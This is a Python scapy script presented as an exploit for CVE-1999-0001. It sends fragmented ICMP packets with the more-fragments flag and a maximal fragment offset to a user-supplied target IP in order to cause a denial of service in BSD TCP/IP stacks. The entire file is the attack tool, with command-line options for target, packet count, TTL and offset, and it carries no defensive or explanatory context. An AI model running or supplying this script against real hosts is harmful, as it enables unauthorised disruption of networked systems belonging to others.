#!/usr/bin/env python3
# CVE-1999-0001 - Denial of Service via malformed fragmented IP packets in BSD TCP/IP stack

import argparse
from scapy.all import IP, ICMP, send

def build_packet(target_ip, ttl, frag_offset):
    packet = IP(dst=target_ip, ttl=ttl, flags="MF", frag=frag_offset) / ICMP()
    return packet

def send_packets(target_ip, count, ttl, frag_offset, verbose):
    for i in range(count):
        pkt = build_packet(target_ip, ttl, frag_offset)
        send(pkt, verbose=0)
        if verbose:
            print(f"[+] Packet {i+1} sent to {target_ip} (frag_offset={frag_offset}, ttl={ttl})")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="CVE-1999-0001 - BSD TCP/IP Stack DoS via malformed IP packets")
    parser.add_argument("-t", "--target", required=True, help="Target IP address")
    parser.add_argument("-c", "--count", type=int, default=5, help="Number of packets to send")
    parser.add_argument("--ttl", type=int, default=64, help="TTL value")
    parser.add_argument("--frag-offset", type=int, default=8191, help="Fragment offset value")
    parser.add_argument("-v", "--verbose", action="store_true", help="Enable verbose output")
    
    args = parser.parse_args()
    send_packets(args.target, args.count, args.ttl, args.frag_offset, args.verbose)
